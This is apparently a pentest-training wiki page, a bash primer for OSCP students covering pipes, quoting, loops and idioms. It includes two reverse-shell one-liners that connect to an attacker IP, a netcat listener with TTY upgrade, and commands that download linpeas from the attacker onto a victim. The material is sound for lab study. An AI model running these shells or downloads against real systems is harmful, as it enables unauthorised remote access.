---
title: Bash and shell primer for pentesters
slug: bash-and-shell-primer
aliases: [shell-primer, bash-primer]
---

{% raw %}

> **TL;DR:** Bash is the language of every pentest box. You don't need to "learn bash" — you need fluency in pipes, redirection, command substitution, loops, and one-liners that you'll paste five times an hour. This is the zero-floor companion to [[kali-linux-primer]].

## Why bash matters more than Python on OSCP
On a compromised box you usually have `/bin/sh` or `/bin/bash`. You may not have Python. You will *always* have bash. Learn it first.

## The five operators that do 80% of the work

| Operator | Reads as | Use |
|---|---|---|
| `|` | "pipe stdout to stdin" | `cat file | grep foo | wc -l` |
| `>` / `>>` | "redirect stdout" / "append" | `echo "x" > out; date >> out` |
| `2>&1` | "merge stderr into stdout" | `cmd > out 2>&1` |
| `$(...)` | "run and substitute" | `kill $(pgrep nginx)` |
| `&&` / `||` | "chain on success / failure" | `make && ./run || echo fail` |

## Loops you'll paste daily

```bash
# Ping sweep a /24
for i in {1..254}; do (ping -c1 -W1 10.10.10.$i >/dev/null && echo 10.10.10.$i) & done; wait

# Try a wordlist of subdomains
while read sub; do curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.target.com"; done < subs.txt

# Loop over a file of hosts
for host in $(cat hosts.txt); do nmap -p 80,443 -sV "$host"; done
```

## Reverse shells in bash (memorise the top two)

```bash
# 1. Bash TCP
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# 2. mkfifo (when bash /dev/tcp is missing)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

Listener side:
```bash
nc -lvnp 4444
# upgrade to a real TTY:
# Ctrl-Z, then on Kali:
stty raw -echo; fg
# then in the shell:
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 columns 200
```

See [[shell-upgrade-techniques]] for full upgrades.

## File transfer one-liners

```bash
# Victim → Attacker (HTTP)
# attacker
python3 -m http.server 80
# victim
curl http://10.10.14.5/linpeas.sh -o /tmp/lp.sh; chmod +x /tmp/lp.sh

# Attacker → Victim (no http server)
# attacker
nc -lvnp 9001 < file.bin
# victim
nc 10.10.14.5 9001 > file.bin

# base64 for tiny things over a shell
base64 -w0 file        # attacker
echo "<paste>" | base64 -d > file   # victim
```

## Quoting (the bug that wastes hours)

| Form | Variables expanded? | Subshells expanded? | Use when |
|---|---|---|---|
| `'single'` | no | no | literal strings (passwords, regex) |
| `"double"` | yes | yes | most commands with variables |
| no quotes | yes | yes | simple words, **never** paths with spaces |

Trap: `find / -name *.conf` will fail if cwd has matching files. Always quote: `find / -name '*.conf'`.

## Useful idioms

```bash
# Strip blank lines + comments
grep -Ev '^(#|$)' file

# Unique sorted
sort file | uniq -c | sort -rn

# Read line-by-line safely
while IFS= read -r line; do echo "[$line]"; done < file

# Background a long job, keep its PID
./slow.sh &
PID=$!
wait $PID

# Trap Ctrl-C cleanup
trap 'rm -f /tmp/work.$$' EXIT
```

## Globs vs regex
- Glob (shell): `*.txt` matches files; `*` is "anything except /".
- Regex (grep/sed/awk): `.*` matches anything; `.` is one char. Different language.

## Process substitution (underused)
```bash
diff <(ls dirA) <(ls dirB)   # treat command output as a file
```

## Pitfalls

- `cmd > out` clobbers; `cmd >> out` appends. Wrong one nukes your notes.
- `for f in $(ls)` breaks on spaces. Use `for f in *` or `find ... -print0 | xargs -0`.
- `if [ $x = "y" ]` breaks when `$x` is empty. Use `[ "$x" = "y" ]`.
- A trailing `;` after `then` / `do` is required on one-liners: `if [ x ]; then echo y; fi`.

## References
- [Bash manual](https://www.gnu.org/software/bash/manual/bash.html)
- [PayloadsAllTheThings — reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [GTFOBins](https://gtfobins.github.io/) — every binary that gives a shell
- See also: [[kali-linux-primer]], [[shell-upgrade-techniques]], [[file-transfer-techniques]]

{% endraw %}
